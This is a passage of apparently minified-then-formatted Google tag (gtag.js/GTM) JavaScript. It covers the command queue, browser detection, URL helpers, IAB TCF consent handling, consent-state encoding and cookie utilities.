          (this.H = !1),
          (this.status = 1);
      },
      ym = function (a, b, c, d) {
        (this.D = Cb()),
          (this.j = b),
          (this.args = c),
          (this.messageContext = d),
          (this.type = a);
      },
      zm = function () {
        (this.destinations = {}), (this.D = {}), (this.j = []);
      },
      vm = function (a, b) {
        var c = b.ia;
        return (a.destinations[c] = a.destinations[c] || new xm());
      },
      Am = function (a, b, c, d) {
        if (d.j) {
          var e = vm(a, d.j),
            f = e.Z;
          if (f) {
            var g = h(c, null),
              k = h(e.P[d.j.id], null),
              m = h(e.K, null),
              n = h(e.j, null),
              p = h(a.D, null),
              q = {};
            if (mj)
              try {
                q = h(Di);
              } catch (v) {
                O(72);
              }
            var r = d.j.prefix,
              t = function (v) {
                om(d.messageContext.eventId, r, v);
              },
              u = Xl(
                Wl(
                  Vl(
                    Ul(
                      (function (a, b) {
                        return (a.eventMetadata = b || {}), a;
                      })(
                        (function (a, b) {
                          return (a.Z = b), a;
                        })(
                          (function (a, b) {
                            return (a.H = b), a;
                          })(
                            (function (a, b) {
                              return (a.K = b), a;
                            })(
                              (function (a, b) {
                                return (a.j = b), a;
                              })(
                                (function (a, b) {
                                  return (a.P = b), a;
                                })(
                                  Nl(
                                    new Ml(
                                      d.messageContext.eventId,
                                      d.messageContext.priorityId
                                    ),
                                    g
                                  ),
                                  k
                                ),
                                m
                              ),
                              n
                            ),
                            p
                          ),
                          q
                        ),
                        d.messageContext.eventMetadata
                      ),
                      function () {
                        if (t) {
                          var v = t;
                          (t = void 0),
                            v("2"),
                            d.messageContext.onSuccess &&
                              d.messageContext.onSuccess();
                        }
                      }
                    ),
                    function () {
                      if (t) {
                        var v = t;
                        (t = void 0),
                          v("3"),
                          d.messageContext.onFailure &&
                            d.messageContext.onFailure();
                      }
                    }
                  ),
                  !!d.messageContext.isGtmEvent
                )
              );
            try {
              om(d.messageContext.eventId, r, "1"),
                Dl(d.type, d.j.id, u),
                f(d.j.id, b, d.D, u);
            } catch (v) {
              om(d.messageContext.eventId, r, "4");
            }
          }
        }
      };
    (zm.prototype.register = function (a, b, c) {
      var d = vm(this, a);
      3 !== d.status &&
        ((d.Z = b), (d.status = 3), c && (h(d.j, c), (d.j = c)), this.flush());
    }),
      (zm.prototype.push = function (a, b, c, d) {
        void 0 !== c &&
          (1 === vm(this, c).status &&
            ((vm(this, c).status = 2), this.push("require", [{}], c, {})),
          vm(this, c).H && (d.deferrable = !1)),
          this.j.push(new ym(a, c, b, d)),
          d.deferrable || this.flush();
      }),
      (zm.prototype.flush = function (a) {
        for (
          var b = this, c = [], d = !1, e = {};
          this.j.length;
          e = { Ec: void 0, qh: void 0 }
        ) {
          var f = this.j[0],
            g = f.j;
          if (f.messageContext.deferrable)
            !g || vm(this, g).H
              ? ((f.messageContext.deferrable = !1), this.j.push(f))
              : c.push(f),
              this.j.shift();
          else {
            switch (f.type) {
              case "require":
                if (3 !== vm(this, g).status && !a)
                  return void this.j.push.apply(this.j, c);
                break;
              case "set":
                z(f.args[0], function (r, t) {
                  h(Kb(r, t), b.D);
                });
                break;
              case "config":
                var k = vm(this, g);
                (e.Ec = {}),
                  z(
                    f.args[0],
                    (function (r) {
                      return function (t, u) {
                        h(Kb(t, u), r.Ec);
                      };
                    })(e)
                  );
                var m = !!e.Ec[P.g.bc];
                delete e.Ec[P.g.bc];
                var n = g.ia === g.id;
                m || (n ? (k.K = {}) : (k.P[g.id] = {})),
                  (k.H && m) || Am(this, P.g.ba, e.Ec, f),
                  (k.H = !0),
                  n ? h(e.Ec, k.K) : (h(e.Ec, k.P[g.id]), O(70)),
                  (d = !0);
                break;
              case "event":
                (e.qh = {}),
                  z(
                    f.args[0],
                    (function (r) {
                      return function (t, u) {
                        h(Kb(t, u), r.qh);
                      };
                    })(e)
                  ),
                  Am(this, f.args[1], e.qh, f);
                break;
              case "get":
                var p = {},
                  q = ((p[P.g.tb] = f.args[0]), (p[P.g.Ib] = f.args[1]), p);
                Am(this, P.g.Ua, q, f);
            }
            this.j.shift(), Bm(this, f);
          }
        }
        this.j.push.apply(this.j, c), d && this.flush();
      });
    var Gm,
      Hm,
      Bm = function (a, b) {
        if ("require" !== b.type)
          if (b.j)
            for (var c = vm(a, b.j).D[b.type] || [], d = 0; d < c.length; d++)
              c[d]();
          else
            for (var e in a.destinations)
              if (a.destinations.hasOwnProperty(e)) {
                var f = a.destinations[e];
                if (f && f.D)
                  for (var g = f.D[b.type] || [], k = 0; k < g.length; k++)
                    g[k]();
              }
      },
      rm = new zm(),
      Em = function (a, b, c) {
        a.addEventListener && a.addEventListener(b, c, !1);
      },
      Fm = function (a, b, c) {
        a.removeEventListener && a.removeEventListener(b, c, !1);
      };
    a: {
      for (var Im = ["CLOSURE_FLAGS"], Jm = Aa, Km = 0; Km < Im.length; Km++)
        if (null == (Jm = Jm[Im[Km]])) {
          Hm = null;
          break a;
        }
      Hm = Jm;
    }
    var Lm = Hm && Hm[610401301];
    function Mm() {
      var a = Aa.navigator;
      if (a) {
        var b = a.userAgent;
        if (b) return b;
      }
      return "";
    }
    Gm = null != Lm && Lm;
    var Nm,
      Om = Aa.navigator;
    function Pm(a) {
      return (
        !!Gm &&
        !!Nm &&
        Nm.brands.some(function (b) {
          var c;
          return (c = b.brand) && -1 != c.indexOf(a);
        })
      );
    }
    function Qm(a) {
      return -1 != Mm().indexOf(a);
    }
    function Rm() {
      return !!Gm && !!Nm && Nm.brands.length > 0;
    }
    function Sm() {
      return !Rm() && Qm("Opera");
    }
    function Tm() {
      return Qm("Firefox") || Qm("FxiOS");
    }
    function Um() {
      return Rm()
        ? Pm("Chromium")
        : ((Qm("Chrome") || Qm("CriOS")) && !(!Rm() && Qm("Edge"))) ||
            Qm("Silk");
    }
    function Vm() {
      return !!Gm && !!Nm && !!Nm.platform;
    }
    function Wm() {
      return Qm("iPhone") && !Qm("iPod") && !Qm("iPad");
    }
    function Xm() {
      Wm() || Qm("iPad") || Qm("iPod");
    }
    (Nm = (Om && Om.userAgentData) || null),
      Sm(),
      Rm() || Qm("Trident") || Qm("MSIE"),
      Qm("Edge"),
      !Qm("Gecko") ||
        (-1 != Mm().toLowerCase().indexOf("webkit") && !Qm("Edge")) ||
        Qm("Trident") ||
        Qm("MSIE") ||
        Qm("Edge"),
      -1 != Mm().toLowerCase().indexOf("webkit") && !Qm("Edge") && Qm("Mobile"),
      Vm() || Qm("Macintosh"),
      Vm() || Qm("Windows"),
      (Vm() ? "Linux" === Nm.platform : Qm("Linux")) || Vm() || Qm("CrOS"),
      Vm() || Qm("Android"),
      Wm(),
      Qm("iPad"),
      Qm("iPod"),
      Xm(),
      Mm().toLowerCase().indexOf("kaios");
    var Ym = function (a, b, c, d) {
        for (var e = b, f = c.length; (e = a.indexOf(c, e)) >= 0 && e < d; ) {
          var g = a.charCodeAt(e - 1);
          if (38 == g || 63 == g) {
            var k = a.charCodeAt(e + f);
            if (!k || 61 == k || 38 == k || 35 == k) return e;
          }
          e += f + 1;
        }
        return -1;
      },
      Zm = /#|$/,
      $m = function (a, b) {
        var c = a.search(Zm),
          d = Ym(a, 0, b, c);
        if (d < 0) return null;
        var e = a.indexOf("&", d);
        return (
          (e < 0 || e > c) && (e = c),
          (d += b.length + 1),
          decodeURIComponent(a.slice(d, -1 !== e ? e : 0).replace(/\+/g, " "))
        );
      },
      an = /[?&]($|#)/,
      bn = function (a, b, c) {
        for (
          var d, g, e = a.search(Zm), f = 0, k = [];
          (g = Ym(a, f, b, e)) >= 0;

        )
          k.push(a.substring(f, g)),
            (f = Math.min(a.indexOf("&", g) + 1 || e, e));
        k.push(a.slice(f)), (d = k.join("").replace(an, "$1"));
        var m,
          p = b + (null != c ? "=" + encodeURIComponent(String(c)) : "");
        if (p) {
          var q,
            r = d.indexOf("#");
          r < 0 && (r = d.length);
          var u,
            t = d.indexOf("?");
          t < 0 || t > r ? ((t = r), (u = "")) : (u = d.substring(t + 1, r));
          var v = (q = [d.slice(0, t), u, d.slice(r)])[1];
          (q[1] = p ? (v ? v + "&" + p : p) : v),
            (m = q[0] + (q[1] ? "?" + q[1] : "") + q[2]);
        } else m = d;
        return m;
      },
      cn = function (a) {
        try {
          var b;
          if ((b = !!a && null != a.location.href))
            a: {
              try {
                vk(a.foo), (b = !0);
                break a;
              } catch (c) {}
              b = !1;
            }
          return b;
        } catch (c) {
          return !1;
        }
      },
      en = function (a) {
        if (G.top == G) return 0;
        if (void 0 !== a && a) {
          var b = G.location.ancestorOrigins;
          if (b) return b[b.length - 1] == G.location.origin ? 1 : 2;
        }
        return cn(G.top) ? 1 : 2;
      };
    function gn(a, b, c, d) {
      (d = void 0 !== d && d),
        a.google_image_requests || (a.google_image_requests = []);
      var e = (function (a) {
        return (a = void 0 === a ? document : a).createElement("img");
      })(a.document);
      if (c) {
        var f = function () {
          if (c) {
            var g = a.google_image_requests,
              k = kc(g, e);
            k >= 0 && Array.prototype.splice.call(g, k, 1);
          }
          Fm(e, "load", f), Fm(e, "error", f);
        };
        Em(e, "load", f), Em(e, "error", f);
      }
      d && (e.attributionSrc = ""),
        (e.src = b),
        a.google_image_requests.push(e);
    }
    var jn = function (a) {
        var b;
        b = void 0 !== b && b;
        var c = "https://pagead2.googlesyndication.com/pagead/gen_204?id=tcfe";
        !(function (a, b) {
          if (a)
            for (var c in a)
              Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
        })(a, function (d, e) {
          (d || 0 === d) && (c += "&" + e + "=" + encodeURIComponent("" + d));
        }),
          hn(c, b);
      },
      hn = function (a, b) {
        var d,
          c = window;
        if (((b = void 0 !== b && b), (d = void 0 !== d && d), c.fetch)) {
          var e = {
            keepalive: !0,
            credentials: "include",
            redirect: "follow",
            method: "get",
            mode: "no-cors",
          };
          d &&
            ((e.mode = "cors"),
            "setAttributionReporting" in XMLHttpRequest.prototype
              ? (e.attributionReporting = {
                  eventSourceEligible: "true",
                  triggerEligible: "false",
                })
              : (e.headers = {
                  "Attribution-Reporting-Eligible": "event-source",
                })),
            c.fetch(a, e);
        } else gn(c, a, void 0 !== b && b, void 0 !== d && d);
      },
      kn = function () {
        (this.P = this.P), (this.D = this.D);
      };
    (kn.prototype.P = !1),
      (kn.prototype.dispose = function () {
        this.P || ((this.P = !0), this.Ra());
      }),
      (kn.prototype[Symbol.dispose] = function () {
        this.dispose();
      }),
      (kn.prototype.addOnDisposeCallback = function (a, b) {
        this.P
          ? void 0 !== b
            ? a.call(b)
            : a()
          : (this.D || (this.D = []), b && (a = a.bind(b)), this.D.push(a));
      }),
      (kn.prototype.Ra = function () {
        if (this.D) for (; this.D.length; ) this.D.shift()();
      });
    var ln = function (a) {
        return (
          void 0 !== a.addtlConsent &&
            "string" != typeof a.addtlConsent &&
            (a.addtlConsent = void 0),
          void 0 !== a.gdprApplies &&
            "boolean" != typeof a.gdprApplies &&
            (a.gdprApplies = void 0),
          (void 0 !== a.tcString && "string" != typeof a.tcString) ||
          (void 0 !== a.listenerId && "number" != typeof a.listenerId)
            ? 2
            : a.cmpStatus && "error" !== a.cmpStatus
            ? 0
            : 3
        );
      },
      mn = function (a, b) {
        var c, d;
        (b = void 0 === b ? {} : b),
          kn.call(this),
          (this.H = a),
          (this.j = null),
          (this.Z = {}),
          (this.nd = 0),
          (this.fc = null != (c = b.jn) ? c : 500),
          (this.fb = null != (d = b.Mn) && d),
          (this.K = null);
      };
    xa(mn, kn),
      (mn.prototype.Ra = function () {
        (this.Z = {}),
          this.K && (Fm(this.H, "message", this.K), delete this.K),
          delete this.Z,
          delete this.H,
          delete this.j,
          kn.prototype.Ra.call(this);
      });
    var on = function (a) {
      return "function" == typeof a.H.__tcfapi || null != nn(a);
    };
    (mn.prototype.addEventListener = function (a) {
      var b = this,
        c = { internalBlockOnErrors: this.fb },
        d = (function (a) {
          var b = a;
          return function () {
            if (b) {
              var c = b;
              (b = null), c();
            }
          };
        })(function () {
          return a(c);
        }),
        e = 0;
      -1 !== this.fc &&
        (e = setTimeout(function () {
          (c.tcString = "tcunavailable"), (c.internalErrorState = 1), d();
        }, this.fc));
      try {
        pn(this, "addEventListener", function (g, k) {
          clearTimeout(e),
            g
              ? (((c = g).internalErrorState = ln(c)),
                (c.internalBlockOnErrors = b.fb),
                (k && 0 === c.internalErrorState) ||
                  ((c.tcString = "tcunavailable"),
                  k || (c.internalErrorState = 3)))
              : ((c.tcString = "tcunavailable"), (c.internalErrorState = 3)),
            a(c);
        });
      } catch (g) {
        (c.tcString = "tcunavailable"),
          (c.internalErrorState = 3),
          e && (clearTimeout(e), (e = 0)),
          d();
      }
    }),
      (mn.prototype.removeEventListener = function (a) {
        a &&
          a.listenerId &&
          pn(this, "removeEventListener", null, a.listenerId);
      });
    var rn = function (a, b, c) {
        var d, e;
        d = void 0 === d ? "755" : d;
        a: {
          if (a.publisher && a.publisher.restrictions) {
            var f = a.publisher.restrictions[b];
            if (void 0 !== f) {
              e = f[void 0 === d ? "755" : d];
              break a;
            }
          }
          e = void 0;
        }
        if (0 === e) return !1;
        var m,
          k = c;
        if (
          (2 === c
            ? ((k = 0), 2 === e && (k = 1))
            : 3 === c && ((k = 1), 1 === e && (k = 0)),
          0 === k)
        )
          if (a.purpose && a.vendor) {
            var n = qn(a.vendor.consents, void 0 === d ? "755" : d);
            m =
              !(
                !n ||
                "1" !== b ||
                !a.purposeOneTreatment ||
                "CH" !== a.publisherCC
              ) ||
              (n && qn(a.purpose.consents, b));
          } else m = !0;
        else
          m =
            1 !== k ||
            !a.purpose ||
            !a.vendor ||
            (qn(a.purpose.legitimateInterests, b) &&
              qn(a.vendor.legitimateInterests, void 0 === d ? "755" : d));
        return m;
      },
      qn = function (a, b) {
        return !(!a || !a[b]);
      },
      pn = function (a, b, c, d) {
        if ((c || (c = function () {}), "function" == typeof a.H.__tcfapi))
          (0, a.H.__tcfapi)(b, 2, c, d);
        else if (nn(a)) {
          sn(a);
          var f = ++a.nd;
          if (((a.Z[f] = c), a.j)) {
            var g = {};
            a.j.postMessage(
              ((g.__tcfapiCall = {
                command: b,
                version: 2,
                callId: f,
                parameter: d,
              }),
              g),
              "*"
            );
          }
        } else c({}, !1);
      },
      nn = function (a) {
        if (a.j) return a.j;
        var b;
        a: {
          for (var c = a.H, d = 0; d < 50; ++d) {
            var e, f;
            try {
              e = !(!c.frames || !c.frames.__tcfapiLocator);
            } catch (k) {
              e = !1;
            }
            if (e) {
              b = c;
              break a;
            }
            b: {
              try {
                var g = c.parent;
                if (g && g != c) {
                  f = g;
                  break b;
                }
              } catch (k) {}
              f = null;
            }
            if (!(c = f)) break;
          }
          b = null;
        }
        return (a.j = b), a.j;
      },
      sn = function (a) {
        a.K ||
          ((a.K = function (b) {
            try {
              var c;
              (c = ("string" == typeof b.data ? JSON.parse(b.data) : b.data)
                .__tcfapiReturn),
                a.Z[c.callId](c.returnValue, c.success);
            } catch (d) {}
          }),
          Em(a.H, "message", a.K));
      },
      tn = function (a) {
        return (
          !1 === a.gdprApplies ||
          (void 0 === a.internalErrorState && (a.internalErrorState = ln(a)),
          "error" === a.cmpStatus || 0 !== a.internalErrorState
            ? !a.internalBlockOnErrors ||
              (jn({ e: String(a.internalErrorState) }), !1)
            : "loaded" === a.cmpStatus &&
              ("tcloaded" === a.eventStatus ||
                "useractioncomplete" === a.eventStatus))
        );
      },
      un = { 1: 0, 3: 0, 4: 0, 7: 3, 9: 3, 10: 3 };
    function vn() {
      var a = hi.tcf || {};
      return (hi.tcf = a);
    }
    var wn = function () {
      return new mn(G, { jn: -1 });
    };
    function xn() {
      var a = vn(),
        b = wn();
      if ((on(b) && !yn() && !zn() && O(124), !a.active && on(b))) {
        yn() &&
          ((a.active = !0),
          (a.kc = {}),
          (a.cmpId = 0),
          (a.tcfPolicyVersion = 0),
          (rk().active = !0),
          (a.tcString = "tcunavailable")),
          (function jl() {
            var a = [P.g.R, P.g.ya, P.g.O];
            rk().waitForUpdate(a, 500, Bk);
          })();
        try {
          b.addEventListener(function (c) {
            if (0 !== c.internalErrorState)
              An(a), kl([P.g.R, P.g.ya, P.g.O]), (rk().active = !0);
            else if (
              ((a.gdprApplies = c.gdprApplies),
              (a.cmpId = c.cmpId),
              (a.enableAdvertiserConsentMode = c.enableAdvertiserConsentMode),
              zn() && (a.active = !0),
              !Bn(c) || yn() || zn())
            ) {
              var d;
              if (
                ((a.tcfPolicyVersion = c.tcfPolicyVersion),
                !1 === c.gdprApplies)
              ) {
                var f,
                  e = {};
                for (f in un) un.hasOwnProperty(f) && (e[f] = !0);
                (d = e), b.removeEventListener(c);
              } else if (Bn(c)) {
                var k,
                  g = {};
                for (k in un)
                  if (un.hasOwnProperty(k))
                    if ("1" === k) {
                      var m,
                        n = c,
                        p = { Nl: !0 };
                      (p = void 0 === p ? {} : p),
                        (m =
                          !!tn(n) &&
                          (!1 === n.gdprApplies ||
                            ("tcunavailable" === n.tcString
                              ? !p.Uj
                              : (!p.Uj && void 0 === n.gdprApplies && !p.Nl) ||
                                !(
                                  p.Uj ||
                                  ("string" == typeof n.tcString &&
                                    n.tcString.length)
                                ) ||
                                rn(n, "1", 0)))),
                        (g[1] = m);
                    } else g[k] = rn(c, k, un[k]);
                d = g;
              }
              if (d) {
                (a.tcString = c.tcString || "tcempty"), (a.kc = d);
                var q = {},
                  r = ((q[P.g.R] = a.kc[1] ? "granted" : "denied"), q);
                !0 !== a.gdprApplies
                  ? (kl([P.g.R, P.g.ya, P.g.O]), (rk().active = !0))
                  : ((r[P.g.ya] = a.kc[3] && a.kc[4] ? "granted" : "denied"),
                    "number" == typeof a.tcfPolicyVersion &&
                    a.tcfPolicyVersion >= 4
                      ? (r[P.g.O] = a.kc[1] && a.kc[7] ? "granted" : "denied")
                      : kl([P.g.O]),
                    el(r, { eventId: 0 }, (a && a.gdprApplies, Cn())));
              }
            } else kl([P.g.R, P.g.ya, P.g.O]);
          });
        } catch (c) {
          An(a), kl([P.g.R, P.g.ya, P.g.O]), (rk().active = !0);
        }
      }
    }
    function An(a) {
      (a.type = "e"), (a.tcString = "tcunavailable");
    }
    function Bn(a) {
      return (
        "tcloaded" === a.eventStatus ||
        "useractioncomplete" === a.eventStatus ||
        "cmpuishown" === a.eventStatus
      );
    }
    function yn() {
      return !0 === G.gtag_enable_tcf_support;
    }
    function zn() {
      return !0 === vn().enableAdvertiserConsentMode;
    }
    function Cn() {
      var a = vn();
      if (a.active) return a.tcString;
    }
    function Dn() {
      var a = vn();
      if (a.active && void 0 !== a.gdprApplies)
        return a.gdprApplies ? "1" : "0";
    }
    var Fn = [P.g.R, P.g.U, P.g.O, P.g.ya],
      Gn = {},
      Hn = ((Gn[P.g.R] = 1), (Gn[P.g.U] = 2), Gn);
    function In(a) {
      if (void 0 === a) return 0;
      switch (Q(a, P.g.ka)) {
        case void 0:
          return 1;
        case !1:
          return 3;
        default:
          return 2;
      }
    }
    function Jn(a) {
      if ("US-CO" === Tk() && !0 === qc.globalPrivacyControl) return !1;
      var b = In(a);
      if (3 === b) return !1;
      switch (Dk(P.g.ya)) {
        case 1:
        case 3:
        case 0:
          return !0;
        case 2:
        default:
          return !1;
        case 4:
          return 2 === b;
      }
    }
    function Kn() {
      return Gk() || !Ck(P.g.R) || !Ck(P.g.U);
    }
    function Ln() {
      var b,
        a = {};
      for (b in Hn) Hn.hasOwnProperty(b) && (a[Hn[b]] = Dk(b));
      return "G1" + He(a[1] || 0) + He(a[2] || 0);
    }
    var Mn = {},
      Nn =
        ((Mn[P.g.R] = 0),
        (Mn[P.g.U] = 1),
        (Mn[P.g.O] = 2),
        (Mn[P.g.ya] = 3),
        Mn);
    function On(a) {
      switch (a) {
        case void 0:
          return 1;
        case !0:
          return 3;
        case !1:
          return 2;
        default:
          return 0;
      }
    }
    function Pn(a) {
      for (var b = "1", c = 0; c < Fn.length; c++) {
        var e,
          d = b,
          f = Fn[c],
          g = Bk.delegatedConsentTypes[f];
        e = void 0 === g ? 0 : Nn.hasOwnProperty(g) ? 12 | Nn[g] : 8;
        var k = rk();
        k.accessedAny = !0;
        var m = k.entries[f] || {};
        b =
          d +
          "" +
          "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[
            (e = (e << 2) | On(m.implicit))
          ] +
          "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[
            (On(m.declare) << 4) | (On(m.default) << 2) | On(m.update)
          ];
      }
      return (
        (b =
          b +
          "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[
            (("US-CO" === Tk() && !0 === qc.globalPrivacyControl ? 1 : 0) <<
              3) |
              ((Gk() ? 1 : 0) << 2) |
              In(a)
          ]),
        U(88) &&
          (b +=
            "" +
            "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[
              (Bk.containerScopedDefaults.ad_storage << 4) |
                (Bk.containerScopedDefaults.analytics_storage << 2) |
                Bk.containerScopedDefaults.ad_user_data
            ] +
            "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[
              ((nb(8) && Bk.usedContainerScopedDefaults ? 1 : 0) << 2) |
                Bk.containerScopedDefaults.ad_personalization
            ]),
        b
      );
    }
    function Qn() {
      if (!Ck(P.g.O)) return "-";
      for (
        var a = Object.keys(fi),
          b = (function Ek(a) {
            for (var b = {}, c = ma(a), d = c.next(); !d.done; d = c.next()) {
              var e = d.value;
              b[e] = !1 !== Bk.corePlatformServices[e];
            }
            return b;
          })(a),
          c = "",
          d = ma(a),
          e = d.next();
        !e.done;
        e = d.next()
      ) {
        var f = e.value;
        b[f] && (c += fi[f]);
      }
      return (
        (!Bk.usedCorePlatformServices || Bk.selectedAllCorePlatformServices) &&
          (c += "o"),
        c || "-"
      );
    }
    function Rn() {
      return Vk() || ((yn() || zn()) && "1" === Dn()) ? "1" : "0";
    }
    function Yn() {
      return !!Vk() || (!(!yn() && !zn()) && "1" === Dn()) || !Ck(P.g.O);
    }
    function Zn() {
      var c,
        a = "0",
        b = "0",
        d = vn();
      "number" == typeof (c = d.active ? d.cmpId : void 0) &&
        c >= 0 &&
        c <= 4095 &&
        ((a =
          "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[
            (c >> 6) & 63
          ]),
        (b = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[
          63 & c
        ]));
      var f,
        e = "0",
        g = vn();
      "number" == typeof (f = g.active ? g.tcfPolicyVersion : void 0) &&
        f >= 0 &&
        f <= 63 &&
        (e = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[
          f
        ]);
      var k = 0;
      Vk() && (k |= 1), "1" === Dn() && (k |= 2), yn() && (k |= 4);
      var n = vn();
      return (
        "1" ===
          (void 0 !== n.enableAdvertiserConsentMode
            ? n.enableAdvertiserConsentMode
              ? "1"
              : "0"
            : void 0) && (k |= 8),
        rk().waitPeriodTimedOut && (k |= 16),
        "1" +
          a +
          b +
          e +
          "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[k]
      );
    }
    function $n() {
      return "US-CO" === Tk();
    }
    var bo = {
      UA: 1,
      AW: 2,
      DC: 3,
      G: 4,
      GF: 5,
      GT: 12,
      GTM: 14,
      HA: 6,
      MC: 7,
    };
    function co(a) {
      a = void 0 === a ? {} : a;
      var b = Qf.ctid.split("-")[0].toUpperCase(),
        c = {};
      (c.ctid = Qf.ctid),
        (c.Om = gi.se),
        (c.Sm = gi.Vg),
        (c.qm = vj.oe ? 2 : 1),
        (c.Zm = a.lk),
        (c.ze = Qf.canonicalContainerId),
        c.ze !== a.xa && (c.xa = a.xa);
      var d = Fj();
      (c.Em = d ? d.canonicalContainerId : void 0),
        mi ? ((c.Uf = bo[b]), c.Uf || (c.Uf = 0)) : (c.Uf = qi ? 13 : 10),
        zi.H ? ((c.Sf = 0), (c.tl = 2)) : (c.Sf = oi ? 1 : 3);
      var e = {};
      (e[6] = wj),
        2 === zi.P ? (e[7] = !0) : 1 === zi.P && (e[2] = !0),
        (c.xl = e);
      var g,
        f = a.Lf,
        k = c.Uf,
        m = c.Sf;
      void 0 === k
        ? (g = "")
        : (m || (m = 0), (g = "" + Je(1, 1) + Ge((k << 2) | m)));
      var q,
        n = c.tl,
        p = "4" + g + (n ? "" + Je(2, 1) + Ge(n) : ""),
        r = c.Sm;
      q = r && Ie.test(r) ? "" + Je(3, 2) + r : "";
      var t,
        v,
        u = c.Om;
      t = u ? "" + Je(4, 1) + Ge(u) : "";
      var w = c.ctid;
      if (w && f) {
        var x = w.split("-"),
          y = x[0].toUpperCase();
        if ("GTM" !== y && "OPT" !== y) v = "";
        else {
          var B = x[1];
          v = "" + Je(5, 3) + Ge(1 + B.length) + (c.qm || 0) + B;
        }
      } else v = "";
      var L,
        A = c.Zm,
        C = c.ze,
        E = c.xa,
        D = c.Wn,
        F =
          p +
          q +
          t +
          v +
          (A ? "" + Je(6, 1) + Ge(A) : "") +
          (C ? "" + Je(7, 3) + Ge(C.length) + C : "") +
          (E ? "" + Je(8, 3) + Ge(E.length) + E : "") +
          (D ? "" + Je(9, 3) + Ge(D.length) + D : ""),
        M = c.xl;
      M = void 0 === M ? {} : M;
      for (
        var R = [], V = ma(Object.keys(M)), aa = V.next();
        !aa.done;
        aa = V.next()
      ) {
        var X = aa.value;
        R[Number(X)] = M[X];
      }
      if (R.length) {
        var na,
          S = Je(10, 3);
        if (0 === R.length) na = Ge(0);
        else {
          for (var la = [], ha = 0, ya = !1, Na = 0; Na < R.length; Na++) {
            ya = !0;
            var Ga = Na % 6;
            R[Na] && (ha |= 1 << Ga),
              5 === Ga && (la.push(Ge(ha)), (ha = 0), (ya = !1));
          }
          ya && la.push(Ge(ha)), (na = la.join(""));
        }
        var Sa = na;
        L = "" + S + Ge(Sa.length) + Sa;
      } else L = "";
      var cb = c.Em;
      return F + L + (cb ? "" + Je(11, 3) + Ge(cb.length) + cb : "");
    }
    var fo,
      eo = {
        Cj: "service_worker_endpoint",
        Wg: "shared_user_id",
        Xg: "shared_user_id_requested",
        ue: "shared_user_id_source",
      };
    function ho(a, b) {
      if (
        ((b = void 0 !== b && b),
        (function go(a) {
          if (!fo) {
            fo = {};
            for (
              var b = ma(Object.keys(eo)), c = b.next();
              !c.done;
              c = b.next()
            )
              fo[eo[c.value]] = !0;
          }
          return !!fo[a];
        })(a))
      ) {
        var c,
          d,
          e =
            null != (d = (c = uc("google_tag_data", {})).xcd)
              ? d
              : (c.xcd = {});
        if (e[a]) return e[a];
        if (b) {
          var f = void 0,
            g = 1,
            k = {},
            m = {
              set: function (n) {
                (f = n), m.notify();
              },
              get: function () {
                return f;
              },
              subscribe: function (n) {
                return (k[String(g)] = n), g++;
              },
              unsubscribe: function (n) {
                var p = String(n);
                return !!k.hasOwnProperty(p) && (delete k[p], !0);
              },
              notify: function () {
                for (
                  var n = ma(Object.keys(k)), p = n.next();
                  !p.done;
                  p = n.next()
                ) {
                  var q = p.value;
                  try {
                    k[q](a, f);
                  } catch (r) {}
                }
              },
            };
          return (e[a] = m);
        }
      }
    }
    function io(a, b) {
      var c = ho(a, !0);
      c && c.set(b);
    }
    function jo(a) {
      var b;
      return null == (b = ho(a)) ? void 0 : b.get();
    }
    function ko(a, b) {
      var c;
      if ("function" == typeof b)
        return null == (c = ho(a, !0)) ? void 0 : c.subscribe(b);
    }
    function lo(a, b) {
      var c = ho(a);
      return !!c && c.unsubscribe(b);
    }
    function mo(a) {
      return "null" !== a.origin;
    }
    function no(a, b, c, d) {
      var e;
      if (oo(d)) {
        for (
          var f = [], g = String(b || po()).split(";"), k = 0;
          k < g.length;
          k++
        ) {
          var m = g[k].split("="),
            n = m[0].replace(/^\s*|\s*$/g, "");
          if (n && n === a) {
            var p = m
              .slice(1)
              .join("=")
              .replace(/^\s*|\s*$/g, "");
            p && c && (p = decodeURIComponent(p)), f.push(p);
          }
        }
        e = f;
      } else e = [];
      return e;
    }
    function qo(a, b, c, d, e) {
      if (oo(e)) {
        var f = (function ro(a, b, c) {
          for (
            var d = [], e = no(a, void 0, void 0, c), f = 0;
            f < e.length;
            f++
          ) {
            var g = e[f].split("."),
              k = g.shift();
            if (!b || !k || -1 !== b.indexOf(k)) {
              var m = g.shift();
              if (m) {
                var n = m.split("-");
                d.push({
                  id: g.join("."),
                  Dl: Number(n[0]) || 1,
                  Gm: Number(n[1]) || 1,
                });
              }
            }
          }
          return d;
        })(a, d, e);
        if (1 === f.length) return f[0].id;
        if (0 !== f.length)
          return 1 ===
            (f = so(
              f,
              function (g) {
                return g.Dl;
              },
              b
            )).length ||
            (f = so(
              f,
              function (g) {
                return g.Gm;
              },
              c
            ))[0]
            ? f[0].id
            : void 0;
      }
    }
    function to(a, b, c, d) {
      var e = po(),
        f = window;
      mo(f) && (f.document.cookie = a);
      var g = po();
      return e !== g || (void 0 !== c && no(b, g, !1, d).indexOf(c) >= 0);
    }
    function yo(a, b, c) {
      return (
        null == c.path && (c.path = "/"),
        c.domain || (c.domain = "auto"),
        (function uo(a, b, c, d) {
          function e(w, x, y) {
            return null == y
              ? (delete k[x], w)
              : ((k[x] = y), w + "; " + x + "=" + y);
          }
          function f(w, x) {
            return null == x ? w : ((k[x] = !0), w + "; " + x);
          }
          if (!oo(c.Cb)) return 2;
          var g;
          null == b
            ? (g = a + "=deleted; expires=" + new Date(0).toUTCString())
            : (c.encode && (b = encodeURIComponent(b)),
              (b = (function vo(a) {
                return a && a.length > 1200 && (a = a.substring(0, 1200)), a;
              })(b)),
